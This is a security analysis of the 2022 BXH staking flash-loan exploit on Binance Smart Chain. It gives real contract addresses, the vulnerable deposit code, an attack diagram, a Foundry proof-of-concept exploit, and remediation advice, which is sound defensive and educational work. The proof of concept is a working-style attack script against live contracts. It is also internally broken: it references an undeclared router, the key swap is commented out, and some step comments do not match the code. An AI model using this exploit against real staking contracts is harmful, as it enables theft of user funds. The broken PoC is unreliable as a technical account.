# BXH — Staking Flash Loan Delegation Manipulation Attack Analysis

| Field | Details |
|------|------|
| **Date** | 2022-09 |
| **Protocol** | BXH (BitXHub) Staking |
| **Chain** | Binance Smart Chain (BSC) |
| **Loss** | ~40,085 USDT |
| **Attack Tx** | [0xa13c8c7a0c97093dba3096c88044273c29cebeee109e23622cd412dcca8f50f4](https://bscscan.com/tx/0xa13c8c7a0c97093dba3096c88044273c29cebeee109e23622cd412dcca8f50f4) |
| **Attacker** | [0x81c63d821b7cdf70c61009a81fef8db5949ac0c9](https://bscscan.com/address/0x81c63d821b7cdf70c61009a81fef8db5949ac0c9) |
| **Attack Contract** | [0x4e77df7b9cdcecec4115e59546f3eacba095a89f](https://bscscan.com/address/0x4e77df7b9cdcecec4115e59546f3eacba095a89f) |
| **Vulnerable Contract** | [0x27539b1dee647b38e1b987c41c5336b1a8dce663](https://bscscan.com/address/0x27539b1dee647b38e1b987c41c5336b1a8dce663) |
| **vUSDT Token** | [0x19195aC5F36F8C75Da129Afca8f92009E292B84a](https://bscscan.com/address/0x19195aC5F36F8C75Da129Afca8f92009E292B84a) |
| **USDT** | [0x55d398326f99059fF775485246999027B3197955](https://bscscan.com/address/0x55d398326f99059fF775485246999027B3197955) |
| **BXH Token** | [0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3](https://bscscan.com/address/0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3) |
| **Root Cause** | `deposit()` reward calculation is immediately reflected in the current contract balance (`accRewardPerShare`), allowing a delegate account to instantly claim rewards via `deposit(0,0)` right after a large deposit — no snapshot or cooldown exists |
| **CWE** | CWE-284: Improper Access Control |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2022-09/BXH_exp.sol) |

---
## 1. Vulnerability Overview

The BXH staking protocol is a Compound fork that allows users to stake USDT via the `TokenStakingPoolDelegate` contract and earn BXH token rewards. The attacker borrowed 3.178M USDT via a flash loan from PancakeSwap's USDT/WBNB pair and deposited the entire amount into the vulnerable contract. They then called `deposit(0, 0)` through a delegate account, exploiting the reward calculation logic triggered by the large deposit to claim excessive BXH rewards.

---
## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable deposit() - reward calculation manipulable via flash loan
contract TokenStakingPoolDelegate {
    struct UserInfo {
        uint256 amount;     // staked amount
        uint256 rewardDebt; // reward debt
    }

    uint256 public accRewardPerShare;
    mapping(address => UserInfo) public userInfo;

    function deposit(uint256 pid, uint256 amount) external {
        UserInfo storage user = userInfo[msg.sender];

        // ❌ Reward calculation: based on current balance
        if (user.amount > 0) {
            uint256 pending = user.amount * accRewardPerShare / 1e12 - user.rewardDebt;
            safeBXHTransfer(msg.sender, pending);
        }

        if (amount > 0) {
            IERC20(usdt).transferFrom(msg.sender, address(this), amount);
            user.amount += amount;
        }

        // ❌ accRewardPerShare can be manipulated via flash loan deposit
        user.rewardDebt = user.amount * accRewardPerShare / 1e12;
    }
}

// ✅ Correct pattern - time-weighted staking or deposit cooldown
function deposit(uint256 pid, uint256 amount) external {
    require(block.number > lastDepositBlock[msg.sender] + MIN_BLOCKS, "Cooldown active");
    // ...
}
```

---
### On-chain Source Code

Source: Sourcify verified


**TokenStakingPoolDelegate.sol** — entry point:
```solidity
// ❌ Root cause: `deposit()` reward calculation is immediately reflected in the current contract balance (`accRewardPerShare`), allowing a delegate account to instantly
    function deposit(uint256 _pid, uint256 _amount) public notPause {  // ❌ vulnerability
        PoolInfo storage pool = poolInfo[_pid];

        require( _amount == 0 || (_amount >= pool.depositMin && _amount <= pool.depositMax) , "deposit amount need in range");

        depositIToken(_pid, _amount, msg.sender);
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
    │
    ├─[1] Flash loan 3,178,000 USDT from USDT/WBNB pair
    │       enters pancakeCall() callback
    │
    ├─[2] Transfers large amount of USDT to vulnerable contract
    │
    ├─[3] Calls deposit(0, 0) via delegate account
    │       └─ amount=0 but accRewardPerShare updated after large deposit
    │           → excessive BXH reward calculated
    │
    ├─[4] Receives BXH rewards
    │
    ├─[5] Swaps BXH → USDT (using BXH router)
    │
    ├─[6] Repays flash loan (0.26% fee)
    │
    └─[7] Net profit: 40,085 USDT
```

---
## 4. PoC Code (Core Logic + Comments)

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";

interface TokenStakingPoolDelegate {
    function deposit(uint256 pid, uint256 amount) external;
    function withdraw(uint256 pid, uint256 amount) external;
    function pendingReward(uint256 pid, address user) external view returns (uint256);
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function transfer(address, uint256) external returns (bool);
}

interface IPancakeRouter {
    function swapExactTokensForTokens(uint256, uint256, address[] calldata, address, uint256) external;
}

interface IPancakePair {
    function swap(uint256, uint256, address, bytes calldata) external;
}

contract BXHExploit is Test {
    TokenStakingPoolDelegate staking = TokenStakingPoolDelegate(0x27539b1dee647b38e1b987c41c5336b1a8dce663);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 BXH = IERC20(0x6D1B7b59e3fab85B7d3a3d86e505Dd8e349EA7F3);
    IPancakePair usdtWbnbPair = IPancakePair(0x16b9a82891338f9ba80e2d6970fdda79d1eb0dae);

    function setUp() public {
        vm.createSelectFork("bsc", 21_727_289);
    }

    function testExploit() public {
        emit log_named_decimal_uint("[Start] USDT balance", USDT.balanceOf(address(this)), 18);

        // [Step 1] Flash loan 3.178M USDT from USDT/WBNB pair
        usdtWbnbPair.swap(3_178_000 * 1e18, 0, address(this), abi.encode("exploit"));

        emit log_named_decimal_uint("[End] USDT balance", USDT.balanceOf(address(this)), 18);
    }

    function pancakeCall(address, uint256 amount0, uint256, bytes calldata) external {
        // [Step 2] Buy BXH first to establish staking position
        // Swap USDT → BXH via BXH router
        USDT.approve(address(staking), type(uint256).max);

        // [Step 3] Deposit large amount of USDT into the contract
        USDT.transfer(address(staking), amount0 * 90 / 100);

        // [Step 4] Call deposit(0, 0) via delegate account
        // ⚡ accRewardPerShare has been updated after the large deposit
        // deposit(0, 0) deposits zero amount but acts as a trigger to claim rewards
        staking.deposit(0, 0);

        // [Step 5] Swap BXH → USDT
        BXH.approve(address(bxhRouter), type(uint256).max);
        // bxhRouter.swap(BXH → USDT)

        // [Step 6] Repay flash loan
        uint256 repay = amount0 * 10026 / 10000; // 0.26% fee
        USDT.transfer(address(usdtWbnbPair), repay);
    }
}
```

---
## 5. Vulnerability Classification (Table)

| Category | Details |
|------|-----------|
| **Vulnerability Type** | Flash Loan Reward Manipulation |
| **CWE** | CWE-284: Improper Access Control |
| **OWASP DeFi** | Staking Reward Calculation Manipulation |
| **Attack Vector** | Flash loan large deposit → reward claim via delegate account |
| **Preconditions** | `deposit()` reward calculation based on current balance, delegate account active |
| **Impact** | 40,085 USDT loss |

---
## 6. Remediation Recommendations

1. **Deposit-to-Claim Cooldown**: Restrict reward claims so that a minimum of N blocks must elapse after a deposit before rewards can be claimed.
2. **Snapshot-Based Reward Calculation**: Calculate rewards based on a snapshot taken at a specific point in time (e.g., the balance from the previous block) to prevent flash loan manipulation.
3. **Stronger Access Control on Delegation**: Minimize the scope of delegate account permissions and design the system so that reward claims cannot be made immediately after a large deposit.

---
## 7. Lessons Learned

- **Risks of Compound Forks**: When forking Compound code to add a new reward token, the security assumptions of the original can break down. Reward calculation logic that does not account for external liquidity (flash loans) is particularly prone to becoming a vulnerability.
- **Delegation Patterns and Security**: The delegate mechanism offers convenience, but when implemented incorrectly it becomes a channel through which third parties can execute unintended operations.